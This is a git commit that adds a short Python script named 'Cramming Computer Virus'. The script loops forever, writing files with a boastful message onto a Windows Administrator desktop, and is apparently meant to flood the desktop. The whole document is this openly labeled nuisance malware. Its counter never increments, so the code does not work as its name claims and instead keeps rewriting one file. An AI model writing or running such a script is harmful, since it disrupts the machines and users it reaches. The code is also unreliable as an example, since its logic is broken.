7f8a0878e0d0d0fd2214bd562dcd9a0e85d82a97
PengPeng3g <69892417+PengPeng3g@users.noreply.github.com>
2020-08-29 17:30:02 +0800

    Add files via upload

---
+++ Cramming Commputer Virus_v1.0.py
@@ -0,0 +1,9 @@
+"""
+Cramming Computer Virus
+Compiler:PengPeng3g
+Compile Time:8/20/2020
+"""
+Nummber = 0
+while True:
+    with open('C:\\Users\Administrator\Desktop\PengPeng3g is a handsome guy!!!%d.txt'%(Nummber),mode = 'w',encoding = 'utf-8') as file:
+        file.write('PengPeng3g is a handsome guy!!!')
